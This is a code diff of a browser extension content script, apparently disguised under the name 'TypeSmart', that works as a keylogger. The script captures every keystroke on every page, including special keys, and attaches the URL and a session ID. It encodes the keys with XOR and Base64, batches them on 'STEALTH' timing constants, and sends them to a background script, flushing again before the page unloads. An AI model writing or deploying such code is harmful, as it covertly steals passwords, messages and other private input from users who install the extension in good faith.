@@ -1,90 +1,81 @@
-// Get the shared constants (DO NOT change these names)
 
+/* global TSConstants, BrowserAPI */
+// Globals are loaded by manifest (constants.js, apiCompat.js loaded first)
 const { MSG_TYPES, STEALTH, OBFUSCATION } = window.TSConstants;
-
-// MSG_TYPES     : message type names between files
-
-// STEALTH       : delay, batch size, minimum length to log
-
-// OBFUSCATION   : XOR key + base64
-
-// ariables + createEntry() function
-
+const API = window.BrowserAPI;
+console.log(
+  "[TypeSmart] Content script loaded  (API: " + API.info.apiType + ")",
+);
+// ============================================================================
+// Variables + createEntry() function
+// ============================================================================
 let buffer = ""; // string that grows with every keystroke
-
 let timer = null; // 3-second timer
-
 let sessionId = Date.now().toString(); // unique session ID
-
 function createEntry(keys) {
   return {
     url: window.location.href,
-
-    timestamp: new Date().toISOString(),
-
+    timestamp: Date.now(), // Unix timestamp in milliseconds
     keys: keys,
-
     sessionId: sessionId,
-
     obfuscated: obfuscate(keys),
   };
 }
-
-// Obfuscation helper
-
+// ============================================================================
+// Obfuscation helper (XOR + Base64)
+// ============================================================================
 function obfuscate(plainText) {
+  // Convert any Unicode characters (like our arrow symbols: ←, →) into a byte string
+  // This prevents btoa() from crashing with InvalidCharacterError
+  const safeString = unescape(encodeURIComponent(plainText));
   let result = "";
-
-  for (let char of plainText) {
-    const code = char.charCodeAt(0) ^ OBFUSCATION.XOR_KEY;
-
+  for (let i = 0; i < safeString.length; i++) {
+    const code = safeString.charCodeAt(i) ^ OBFUSCATION.XOR_KEY;
     result += String.fromCharCode(code);
   }
-
-  return btoa(result);
+  return btoa(result); // Base64 encode
 }
-
-//Communication + Flush + Keylogger (improved)
-
-// Helper: Send to background.js
-
-function sendMessage(entry) {
-  chrome.runtime.sendMessage({
-    type: MSG_TYPES.LOG_KEYS,
-
-    payload: JSON.stringify(entry),
-  });
-}
-
-// Main flush
-
+// ============================================================================
+// Communication with background.js
+// ============================================================================
 function flushBuffer() {
   if (buffer.length === 0) return;
-
   const entry = createEntry(buffer);
-
-  sendMessage(entry);
-
-  buffer = "";
-
-  console.log("Flushed buffer to background");
+  // Send to background script
+  API.runtime
+    .sendMessage({
+      type: MSG_TYPES.LOG_KEYS,
+      payload: JSON.stringify(entry),
+    })
+    .then((response) => {
+      if (
+        response &&
+        (response.status === "logged" || response.success === true)
+      ) {
+        buffer = ""; // Clear buffer after successful flush
+        clearTimeout(timer);
+        timer = null;
+      }
+    })
+    .catch((err) => {
+      console.error("[TypeSmart] Failed to send keystrokes:", err);
+    });
 }
-
-// Reset timer
-
 function resetTimer() {
-  if (timer) clearTimeout(timer);
-
-  timer = setTimeout(flushBuffer, STEALTH.DELAY_MS);
+  if (timer !== null) {
+    clearTimeout(timer);
+  }
+  timer = setTimeout(() => {
+    flushBuffer();
+  }, STEALTH.DELAY_MS);
 }
-
-// ==================== MAIN KEYLOGGER (with special keys + MIN_KEY_LENGTH) ====================
-
+// ============================================================================
+// Main keylogger: Capture all keystrokes
+// ============================================================================
 document.addEventListener("keydown", (e) => {
-  let char = ""; // === Special keys handling (makes it much more realistic) ===
-
+  let char = "";
   if (e.key === "Backspace") char = "[BKSP]";
-  else if (e.key === "Enter") char = "[ENTER]";
+  else if (e.key === "Enter" || e.key === "Return") char = "[ENTER]";
   else if (e.key === "Tab") char = "[TAB]";
   else if (e.key === "Shift") char = "[SHIFT]";
   else if (e.key === "Control") char = "[CTRL]";
@@ -94,11 +85,9 @@ document.addEventListener("keydown", (e) => {
   else if (e.key === "ArrowUp") char = "[↑]";
   else if (e.key === "ArrowDown") char = "[↓]";
   else if (e.key.length === 1) char = e.key; // normal printable char
-
   if (char === "") return; // ignore other keys (CapsLock, etc.)
-
-  buffer += char; // === Use MIN_KEY_LENGTH to reduce noise ===
-
+  buffer += char;
+  // Flush if batch size reached or minimum length exceeded
   if (
     buffer.length >= STEALTH.BATCH_SIZE ||
     buffer.length >= STEALTH.MIN_KEY_LENGTH
@@ -108,5 +97,5 @@ document.addEventListener("keydown", (e) => {
     resetTimer();
   }
 });
-
+// Flush any remaining keystrokes before page unload
 window.addEventListener("beforeunload", flushBuffer);
